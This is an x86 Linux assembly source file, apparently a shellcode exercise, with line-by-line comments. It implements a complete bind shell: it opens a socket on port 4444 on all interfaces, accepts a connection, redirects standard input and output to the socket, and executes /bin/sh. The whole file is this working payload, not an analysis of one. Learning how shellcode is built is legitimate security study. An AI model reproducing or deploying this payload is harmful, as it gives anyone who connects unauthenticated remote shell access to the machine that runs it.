global _start

section .text
_start: 

	XOR EAX, EAX     ; set EAX to zero
	XOR EBX, EBX     ; set EBX to zero
	XOR ECX, ECX     ; set ECX to zero
	XOR EDX, EDX     ; set EDX to zero

        ; socket syscall
	MOV AX, 0x167    ; 0x167 is hex syscall to socket
	MOV BL, 2        ; set domain argument
	MOV CL, 1        ; set type argument
	MOV DL, 6        ; set protocol argument
	INT 0x80         ; interrupt

	MOV EDI, EAX     ; as result of socket syscall descriptor is saved in EAX
	                 ; descriptor will be used with several other syscalls so
	                 ; we need to save it some how for later use. One way is
	                 ; to save it in EDI register which is least likely to be 
	                 ; used in following syscalls
    
        ; bind syscall
	XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
	PUSH ECX         ; push zero_sin = 0 to the stack
	PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
	PUSH word 0xc511 ; push hex 0x115c (dec 4444) in reverse oreder due to little endian
	PUSH byte 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET

	MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
	MOV EAX, 0x169   ; move bind syscall number in EAX register
	MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
	MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
	INT 0x80         ; interrupt

        ; listen syscall
	XOR EAX, EAX     ; set EAX to zero
	MOV EAX, 0x16B   ; move 0x16B to EAX
	MOV EBX, EDI     ; move socket descriptor into EBX as first argument
	MOV CL,  0x2     ; move "2" as backlog into ECX as second argument
	INT 0x80         ; interrupt

        ; accept syscall
	XOR EAX, EAX     ; set EAX to zero for clean start
	MOV EAX, 0x16C   ; move accept syscall number (0x16C) in EAX
	MOV EBX, EDI     ; move socket descriptor from EDI to EBX as first argument
	XOR ECX, ECX     ; set ECX to zero as argument is NULL
	XOR EDX, EDX     ; set EDX to zero as argument is NULL
	XOR ESI, ESI     ; set flag to 0 by XOR-ing
	INT 0x80         ; interrupt

	XOR EDI, EDI     ; set EDI to zero
	MOV EDI, EAX     ; As result, new socket descriptor will be saved in EAX 
	                 ; so we can move it to EDI for further use.

        ; dup2 syscall
	MOV CL, 0x3     ; putting 3 in the counter

LOOP_DUP2:
	XOR EAX, EAX    ; clear EAX
	MOV AL, 0x3F    ; putting the syscall code in EAX
	MOV EBX, EDI    ; putting our new socket descriptor in EBX
	DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
	INT 0x80        ; interrupt
	JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set

 
        ; execve syscall
	XOR EAX, EAX
	PUSH EAX
	PUSH 0x68732f6E
	PUSH 0x69622f2F
	MOV EBX, ESP
	PUSH EAX
	MOV EDX, ESP
	PUSH EBX
	MOV ECX, ESP
	MOV AL, 0x0B
	INT 0x80

